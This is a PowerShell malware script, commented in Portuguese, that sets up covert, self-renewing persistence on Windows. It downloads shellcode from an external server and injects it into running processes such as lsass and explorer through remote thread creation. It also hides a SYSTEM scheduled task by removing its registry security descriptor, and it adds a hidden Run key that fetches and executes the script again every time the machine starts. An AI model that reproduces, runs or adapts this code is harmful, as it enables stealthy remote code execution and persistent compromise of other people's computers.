# =====================================================
# persist.ps1 - PERSISTÊNCIA INDESTRUTÍVEL
# Roda: SYSTEM | Fileless | Reinjeta a cada 5min | Rootkit
# =====================================================

# === 1. FUNÇÃO: INJETAR SHELLCODE EM PROCESSO ALEATÓRIO ===
function Invoke-Shellcode {
    param([byte[]]$Shellcode)

    $whitelist = "svchost","explorer","msedge","chrome","notepad","winlogon","lsass"
    $proc = Get-Process | Where-Object {$whitelist -contains $_.Name} | Get-Random
    if(!$proc){ Start-Process explorer.exe -WindowStyle Hidden; Start-Sleep 2; $proc = Get-Process explorer | Select -First 1 }

    Add-Type @"
using System; using System.Runtime.InteropServices;
public class K32 {
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(int a,bool b,int c);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint f,IntPtr i);
}
"@
    $h = [K32]::OpenProcess(0x1F0FFF,$false,$proc.Id)
    $a = [K32]::VirtualAllocEx($h,[IntPtr]::Zero,$Shellcode.Length,0x3000,0x40)
    [K32]::WriteProcessMemory($h,$a,$Shellcode,$Shellcode.Length,[ref]0)
    [K32]::CreateRemoteThread($h,[IntPtr]::Zero,0,$a,[IntPtr]::Zero,0,[IntPtr]::Zero)
}

# === 2. BAIXAR SHELLCODE DO SERVIDOR ===
$ShellcodeUrl = "http://hateyouroot.site/payload_shc.bin"
try {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent","Mozilla/5.0")
    $Shellcode = $wc.DownloadData($ShellcodeUrl)
} catch { exit }

# === 3. ROOTKIT: ESCONDER TAREFA E PROCESSO ===
function Hide-Task {
    $taskName = "WindowsCoreService"
    $reg = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
    if(Test-Path $reg){
        Remove-ItemProperty -Path $reg -Name "SD" -Force -ErrorAction SilentlyContinue
    }
}
Hide-Task

# === 4. REGISTRY RUN (BACKUP) ===
$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$runVal = 'powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(''http://hateyouroot.site/persist.ps1'''))"'
if(!(Get-ItemProperty -Path $runKey -Name "WindowsHelper" -ErrorAction SilentlyContinue)){
    New-ItemProperty -Path $runKey -Name "WindowsHelper" -Value $runVal -PropertyType String -Force | Out-Null
}

# === 5. LOOP INFINITO: REINJETAR A CADA 5 MIN ===
while($true) {
    try {
        Invoke-Shellcode -Shellcode $Shellcode
    } catch { }
    
    # Recria tarefa se deletada
    if(!(Get-ScheduledTask -TaskName "WindowsCoreService" -ErrorAction SilentlyContinue)){
        $action = 'powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(''http://hateyouroot.site/persist.ps1'''))"'
        schtasks /create /tn "WindowsCoreService" /tr $action /sc onstart /ru SYSTEM /f 2>$null
        schtasks /create /tn "WindowsCoreService" /tr $action /sc onlogon /ru SYSTEM /f 2>$null
        Hide-Task
    }

    Start-Sleep -Seconds 300  # 5 minutos
}
